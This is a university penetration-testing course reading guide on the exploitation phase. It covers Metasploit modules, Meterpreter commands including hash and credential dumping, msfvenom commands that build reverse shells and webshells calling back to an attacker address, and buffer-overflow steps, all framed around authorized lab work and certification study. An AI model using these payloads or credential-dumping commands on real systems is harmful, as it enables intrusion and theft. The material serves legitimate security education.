# Reading Guide: Module 07 — Exploitation Techniques

## Course: CIS-4333 Penetration Testing

## Texas Wesleyan University | Professor Nash

## Certification Alignment: CompTIA PenTest+ (PT0-002)

---

## Introduction

Module 07 covers the exploitation phase — the point in a penetration test where discovered vulnerabilities are actively leveraged to gain unauthorized access (with written authorization). This phase falls within PT0-002 Domain 3: Attacks and Exploits, which accounts for 30% of the exam — the highest-weighted domain.

The exploitation phase transforms enumeration findings into demonstrated risk. A vulnerability that cannot be exploited is a theoretical risk. A vulnerability that produces a shell is a confirmed, quantifiable risk that the client must address.

**Legal and Ethical Reminder:** Exploitation must occur only within explicitly authorized scope. Written authorization is required. Every exploit attempt must be documented with timestamp, target, exploit used, and result. Exploitation against unauthorized systems is illegal regardless of the tester's intentions. All lab work uses isolated environments only — Metasploitable 2, HackTheBox lab VMs, and TryHackMe rooms.

---

## 1. Metasploit Framework Reference

### Module Type Reference

| Type | Path Prefix | Purpose |
|------|------------|---------|
| Exploit | `exploit/` | Delivers payload using a vulnerability |
| Auxiliary | `auxiliary/` | Scanning, brute force, fuzzing |
| Payload | `payload/` | Code that runs on target after exploitation |
| Post | `post/` | Post-exploitation operations |
| Encoder | `encoder/` | Obfuscates payloads |
| NOP | `nop/` | NOP sled generators for buffer overflows |
| Evasion | `evasion/` | AV/EDR bypass |

### Core msfconsole Commands

```text
# Navigation
help                          List all commands
search [term]                 Search for modules
use [module_path]             Select a module
back                          Return to main prompt
info                          Show module details
show options                  Display required and optional settings
show payloads                 List compatible payloads
show targets                  List supported target OS/architectures

# Configuration
set OPTION value              Set a module option
setg OPTION value             Set global option (persists across modules)
unset OPTION                  Clear an option
spool /path/to/file           Log all output to file

# Execution
check                         Test if target is vulnerable (no exploitation)
run / exploit                 Execute the module
exploit -j                    Run in background as a job

# Session management
sessions -l                   List active sessions
sessions -i [id]              Interact with session
sessions -k [id]              Kill session
sessions -u [id]              Upgrade shell to Meterpreter
jobs                          List background jobs
kill [job_id]                 Kill a background job
```

### msfdb — Database Integration

```bash
# Initialize and start PostgreSQL database
sudo msfdb init
sudo msfdb start

# Inside msfconsole
msf6 > db_status
msf6 > workspace -a engagement_name
msf6 > db_nmap -sV -O 192.168.1.0/24
msf6 > hosts
msf6 > services
msf6 > vulns
```

Using the database allows testers to store scan results, discovered hosts, and session data in an organized, searchable format.

---

## 2. Payload Architecture

### Staged vs. Stageless — The Critical Distinction

| Feature | Staged | Stageless |
|---------|--------|-----------|
| Naming convention | `type/reverse_tcp` (slash) | `type_reverse_tcp` (underscore) |
| Delivery | Two-stage: stager + stage | Single binary |
| Size | Small initial payload | Larger |
| Network requirement | Requires callback to download stage | No additional download |
| Stealth | Less — additional traffic | More — no stage download |
| Use case | Size-restricted exploits | Isolated networks, size not a concern |

### Common Payload Types

| Payload | Description |
|---------|-------------|
| `shell/reverse_tcp` | Basic command shell (staged) |
| `shell_reverse_tcp` | Basic command shell (stageless) |
| `meterpreter/reverse_tcp` | Meterpreter shell (staged, TCP) |
| `meterpreter/reverse_https` | Meterpreter over HTTPS (evades inspection) |
| `meterpreter_reverse_tcp` | Meterpreter stageless |
| `shell/bind_tcp` | Binds a shell on target — attacker connects in |
| `meterpreter/bind_tcp` | Meterpreter bind — attacker connects in |

### Connection Directions

**Reverse payload** — target connects back to the attacker. Better for bypassing firewalls because outbound connections are typically allowed.

**Bind payload** — attacker connects to a port opened on the target. Useful when direct inbound access to the target is possible; blocked by most firewalls.

---

## 3. Meterpreter Command Reference

### System Information and Session

```text
sysinfo             OS name, hostname, architecture
getuid              Current user context
getpid              Meterpreter process ID
ps                  List all running processes
migrate [PID]       Move Meterpreter to another process
shell               Drop to operating system command shell
getsystem           Attempt automated privilege escalation
hashdump            Dump local password hashes (requires SYSTEM)
```

### File System

```text
pwd                 Print working directory
ls                  List directory contents
cd [path]           Change directory
cat [file]          Display file contents
upload [local] [remote]    Upload file to target
download [remote] [local]  Download file from target
search -f *.txt     Search for files by pattern
edit [file]         Open file in editor
```

### Networking and Pivoting

```text
ipconfig            Network interface information
arp                 ARP table
route               Routing table
portfwd add -l [local_port] -p [remote_port] -r [remote_IP]
run autoroute -s [subnet/mask]
```

### Post-Exploitation Modules from Meterpreter

```text
run post/windows/gather/hashdump
run post/windows/gather/credentials/credential_collector
run post/multi/recon/local_exploit_suggester
run post/windows/manage/enable_rdp
run post/linux/gather/hashdump
```

---

## 4. msfvenom Payload Generation

### Core Flags

| Flag | Purpose | Example |
|------|---------|---------|
| `-p` | Payload name | `-p windows/x64/meterpreter/reverse_tcp` |
| `LHOST=` | Attacker IP | `LHOST=192.168.1.10` |
| `LPORT=` | Listener port | `LPORT=4444` |
| `-f` | Output format | `-f exe`, `-f elf`, `-f php`, `-f raw` |
| `-o` | Output file | `-o payload.exe` |
| `-e` | Encoder | `-e x86/shikata_ga_nai` |
| `-i` | Encoding iterations | `-i 5` |
| `-b` | Bad characters to avoid | `-b "\x00\x0a\x0d"` |
| `-n` | NOP sled size | `-n 16` |
| `--list` | List options | `--list payloads`, `--list formats` |

### Common msfvenom Examples

```bash
# Windows 64-bit staged Meterpreter reverse TCP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o win_shell.exe

# Linux ELF reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o linux_shell.elf

# PHP webshell
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f raw > shell.php

# ASP.NET shell for IIS targets
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f aspx -o shell.aspx

# Java WAR file for Apache Tomcat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f war -o shell.war
```

---

## 5. Buffer Overflow Concepts

### Stack Memory Layout

```text
High memory addresses
  +-------------------------+
  | Function Arguments      |
  +-------------------------+
  | Saved Return Address    |  <-- EIP target
  +-------------------------+
  | Saved Base Pointer (EBP)|
  +-------------------------+
  | Local Variable Buffer   |  <-- User input written here
  +-------------------------+
Low memory addresses
```

### Classic Stack Overflow Exploitation Steps

| Step | Action | Tool |
|------|--------|------|
| 1 | Fuzz to find crash offset | Python fuzzer, spike |
| 2 | Generate unique pattern | `msf-pattern_create -l [length]` |
| 3 | Find pattern offset in EIP | `msf-pattern_offset -q [EIP value]` |
| 4 | Confirm EIP control | Send `A * offset + BBBB + C * rest` |
| 5 | Identify bad characters | Send all characters; check which cause issues |
| 6 | Find JMP ESP gadget | `mona.py` in Immunity Debugger, ROPgadget |
| 7 | Generate shellcode | `msfvenom -b [bad chars]` |
| 8 | Build final exploit | offset + JMP ESP address + NOP sled + shellcode |

### Pattern Creation and Offset Tools

```bash
# Generate a 2000-byte unique pattern
msf-pattern_create -l 2000

# Find the offset of a 4-byte value that landed in EIP
msf-pattern_offset -q 39694438

# Alternative: cyclic from pwntools
python3 -c "from pwn import *; print(cyclic(2000))"
python3 -c "from pwn import *; print(cyclic_find(0x39694438))"
```

---

## 6. Exploit Research Resources

| Resource | URL | Purpose |
|----------|-----|---------|
| Exploit-DB | exploit-db.com | CVE-indexed exploit archive |
| National Vulnerability Database | nvd.nist.gov | Official CVE database with CVSS |
| Rapid7 Vulnerability Database | rapid7.com/db | Metasploit module CVE mapping |
| Packet Storm Security | packetstormsecurity.com | Exploit and advisory archive |
| GitHub | github.com | PoC exploit repositories |
| searchsploit | CLI tool (Kali) | Offline Exploit-DB search |

```bash
# searchsploit usage
searchsploit vsftpd
searchsploit -t "Apache 2.4"
searchsploit -m 49757     # Copy exploit file to current directory
searchsploit --cve 2021-41773
```

---

## 7. PenTest+ Exam Tips

- **Module type identification**: The exam presents scenarios and asks which module type to use. Exploitation = exploit; discovery/scanning = auxiliary; running on compromised system = post.

- **Staged vs. stageless**: The `/` vs. `_` naming convention is specifically tested. `meterpreter/reverse_tcp` is staged; `meterpreter_reverse_tcp` is stageless.

- **Meterpreter runs in memory**: This is tested as a stealth characteristic. No file written to disk means fewer forensic artifacts.

- **Buffer overflow concepts**: The exam tests conceptual understanding — EIP control, NOP sleds, shellcode placement. You will not need to write a full exploit from scratch on the exam.

- **msfvenom vs. Metasploit payloads**: msfvenom generates standalone binaries for manual delivery. Metasploit payloads are used within the framework. Both ultimately run the same code on the target.

- **`check` command**: Know that `check` verifies vulnerability without exploiting. Not all modules support `check`.

- **Bind vs. reverse**: Reverse shells bypass firewalls because they originate from the target (outbound). Bind shells require the attacker to connect inbound — typically blocked by firewalls on internet-facing targets.

- **Responsible use**: The exam tests that testers obtain verification before exploitation, document all actions, and stay within scope. These are not just ethical points — they are exam questions.

---

## 8. Exploitation Documentation Template

For each exploitation attempt, record:

```text
Date/Time:      2026-06-02 14:32:00
Target IP:      192.168.1.50
Target Port:    21
Service:        vsftpd 2.3.4
CVE:            CVE-2011-2523
Module Used:    exploit/unix/ftp/vsftpd_234_backdoor
Payload:        cmd/unix/interact
LHOST:          N/A (bind shell)
Result:         SUCCESS — shell on port 6200, user: root
Session ID:     1
Notes:          Root shell obtained immediately — no privilege escalation required
```

This documentation becomes the evidence base for the penetration test report.

---

## 9. Study Checklist

- [ ] Explain the six Metasploit module types and what each does
- [ ] Distinguish staged from stageless payloads using the naming convention
- [ ] List five Meterpreter commands and describe what each reveals
- [ ] Explain the buffer overflow exploitation sequence: fuzz, pattern, offset, EIP control, JMP ESP, shellcode
- [ ] Describe what msfvenom does and list three output formats it supports
- [ ] Explain the difference between reverse and bind payloads and when each is used
- [ ] Complete the Module 07 lab against Metasploitable 2
- [ ] Review PT0-002 Domain 3 exam objectives prior to quiz

---

---

## 10. Supplemental Resources

**1. Metasploit Unleashed — Free Offensive Security Course**
[https://www.metasploitunleashed.com/](https://www.metasploitunleashed.com/)
Offensive Security's free Metasploit Unleashed course is the most comprehensive free reference for the Metasploit Framework, covering module types, payload selection, post-exploitation, pivoting, and Meterpreter in depth. It directly reinforces all Module 07 content and provides hands-on exercises that extend the lab material.

**2. Rapid7 Metasploit Documentation — Module Reference**
[https://docs.metasploit.com/](https://docs.metasploit.com/)
The official Metasploit documentation from Rapid7 includes module development guides, payload architecture explanations, and API references. The staged vs. stageless payload documentation and msfvenom reference are directly applicable to PT0-002 Domain 3 (Exploitation) exam objectives covered in Module 07.

**3. TryHackMe — Metasploit Room Series**
[https://tryhackme.com/room/metasploitintro](https://tryhackme.com/room/metasploitintro)
TryHackMe's Metasploit introduction room provides guided hands-on practice with the Metasploit console, module configuration, payload delivery, and Meterpreter commands against live vulnerable machines. Completing the room series reinforces all Module 07 lab skills in a safe, pre-authorized environment.

**Proprietary and Confidential. Not for disclosure outside of Texas Wesleyan University course use.**
